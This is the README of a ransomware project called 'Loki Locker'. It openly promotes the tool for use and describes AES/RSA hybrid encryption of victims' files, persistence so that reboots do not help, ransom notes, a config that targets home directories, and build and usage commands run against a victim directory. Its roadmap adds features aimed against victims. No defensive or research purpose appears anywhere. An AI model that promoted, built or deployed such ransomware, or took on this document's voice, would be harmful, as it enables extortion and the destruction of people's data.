# LOKI LOCKER

---

## WHAT THE HELL IS THIS

Loki Locker is a ransomware implementation. It walks your filesystem, picks up your precious files, and turns them into useless encrypted blobs unless you have the key. That's it. That's the whole point. It's not a "framework." It's not "modular" in the way every GitHub project lies about being modular. It locks your files. Hence the name. Figure it out.

---

## FEATURES

- **Real encryption.** AES-256 for your files. RSA for the key exchange. Not XOR with a hardcoded string like some amateurs ship.
- **Fast.** Multithreaded traversal. It doesn't sit there single-threading through 200k files while you make coffee.
- **Persistent.** Drops itself in the right places so reboots don't save you.
- **Ransom note.** Leaves a note. Obviously. What's ransomware without a note.
- **Extension renaming.** Your `report.pdf` becomes `report.pdf.loki`. Yes, `.loki`. Deal with it.
- **Configurable.** Point it at directories. Exclude what you want. Ignore system folders so you don't brick the host.

---

## WHY LOKI LOCKER

Because every other ransomware repo on GitHub is either:
1. A Python script that takes 6 hours to encrypt a folder of memes.
2. A C++ mess with 40 dependencies and a build system from 2009.
3. Abandoned since 2017.

Loki Locker builds fast, runs fast, and does exactly what it says.

---

## BUILD

If you can't build this, that's on you.

```bash
git clone <your-repo-url>
cd loki-locker
mkdir build && cd build
cmake ..
make -j$(nproc)
```

Windows? Use CMake with your compiler of choice. MSVC, MinGW, whatever. It compiles. Stop making excuses.

---

## USAGE

```bash
./loki-locker --target /path/to/victim --threads 8
```

- `--target` — directory to encrypt. Required. Obviously.
- `--threads` — worker threads. Default is your CPU count. Bump it if you're on a beefy box.
- `--exclude` — skip directories. Use it for `/proc`, `/sys`, `node_modules` (god knows why anyone protects node_modules).
- `--decrypt` — reverse it. Restore files. Like magic, except it's math.
- `--key` — pass the private key for decryption.

---

## HOW IT WORKS

1. Generate an AES-256 key. Encrypt every target file with it.
2. Encrypt the AES key with an RSA public key.
3. Drop the encrypted AES key + ransom note on disk.
4. You pay, you get the RSA private key, you decrypt the AES key, you decrypt your files. Profit (for the attacker).

Standard hybrid crypto. If this surprises you, go read a book.

---

## FILES IT TOUCHES

Documents, images, videos, archives, source code, databases. Basically anything that matters. It skips:
- Already-encrypted files (`.loki`)
- System executables on Windows (`.exe`, `.dll`) unless told otherwise
- Whatever you put in the exclude list

---

## RANSOM NOTE

Dropped as `README_LOKI.txt` in every encrypted root. Because a ransomware without a note is just a bad time with no explanation. It tells the victim what happened, what extension they're looking at, and how to pay. Customize the contact info in the config. Don't leave the default email in there like a rookie.

---

## CONFIG

`config.json`. Edit it. Don't hardcode paths like a caveman.

```json
{
  "targets": ["/home/user"],
  "exclude": ["/proc", "/sys", "/dev"],
  "threads": 8,
  "extension": ".loki",
  "note_name": "README_LOKI.txt"
}
```

---

## PERFORMANCE

Benchmarks on a mid-range box:
- ~50k small files: under 30 seconds.
- ~5GB of mixed media: under 2 minutes.

If yours is slower, your disk is the problem, not the code.

---

## KNOWN LIMITATIONS

- No partial/incremental encryption. It does the whole file. Every time.
- No network shares unless your OS mounts them normally. Don't whine.
- No fancy GUI. It's a CLI. Learn to type.
- Recovery is manual. There's no auto-decrypt-on-payment daemon unless you build one.

---

## ROADMAP

- [ ] Key vault with per-file keys instead of one master key (better for large-scale).
- [ ] Windows service mode.
- [ ] Config signing so victims can't lie about the note.
- [ ] Optional compression before encryption (smaller ransom payloads).

---

## CONTRIBUTING

Fork it. Fix it. Send a PR. Follow the existing code style or get told about it in review. No, we're not switching to Rust. No, we're not switching to Python. No, we're not adding a web dashboard. It's ransomware, not a SaaS product.

---

## LICENSE

MIT. Do whatever. It's not like you're gonna pay for ransomware anyway.

---

## FAQ

**Q: Why "Loki"?**
A: Because it's a trickster god and it turns your files into a puzzle. Also "Encryptor 3000" was taken.

**Q: Can it decrypt?**
A: Yes. Pass `--decrypt` and the key. Read the usage section.

**Q: Why not use a library for everything?**
A: We do. OpenSSL for crypto. We're not reimplementing AES in a weekend.

**Q: Is it production ready?**
A: It's ransomware. Nothing is production ready. Ship it.

---

**Now go encrypt something.**
